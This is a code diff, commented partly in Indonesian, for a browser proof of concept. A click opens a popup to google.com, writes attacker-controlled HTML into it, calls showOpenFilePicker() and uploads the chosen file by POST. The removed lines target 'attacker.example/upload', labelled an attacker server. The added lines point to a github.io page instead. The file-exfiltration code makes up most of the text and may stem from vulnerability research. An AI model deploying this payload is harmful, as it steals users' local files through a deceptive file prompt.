@@ -8,10 +8,9 @@
 const log = t => { document.getElementById('log').textContent += t + '\n'; console.log(t); };
 
 document.getElementById('go').addEventListener('click', () => {
-  // 1) buka popup kosong (synchronous, direct user gesture)
+  // Buka popup kosong yang bisa kita tulis — harus synchronous dari klik
   const w = window.open('https://www.google.com', '_blank', 'width=600,height=400');
 
-  // 2) tulis dokumen popup langsung sehingga kita mengontrol kontennya
   const html = `
     <!doctype html>
     <html>
@@ -20,7 +19,6 @@ document.getElementById('go').addEventListener('click', () => {
       <pre id="p"></pre>
       <script>
         const p = s => { document.getElementById('p').textContent += s + '\\n'; console.log(s); };
-
         (async function(){
           try {
             p('Calling showOpenFilePicker() now...');
@@ -31,11 +29,10 @@ document.getElementById('go').addEventListener('click', () => {
             const file = await fh.getFile();
             p('Got file: ' + file.name + ' size=' + file.size);
 
-            // upload to attacker server (adjust URL)
+            // contoh upload (ganti URL dengan server testingmu yang CORS-enabled)
             const fd = new FormData();
             fd.append('file', file, file.name);
-            // NOTE: Replace with your testing server URL (must accept CORS for the origin)
-            const res = await fetch('https://attacker.example/upload', { method: 'POST', body: fd });
+            const res = await fetch('https://nurhayatikania1.github.io/poc12.html', { method: 'POST', body: fd });
             p('Upload sent, status=' + res.status);
           } catch (e) {
             p('Error: ' + (e && e.name) + ' ' + (e && e.message));
@@ -45,7 +42,7 @@ document.getElementById('go').addEventListener('click', () => {
     </body>
     </html>
   `;
-  // write and close so it loads and runs synchronously
+
   w.document.open();
   w.document.write(html);
   w.document.close();
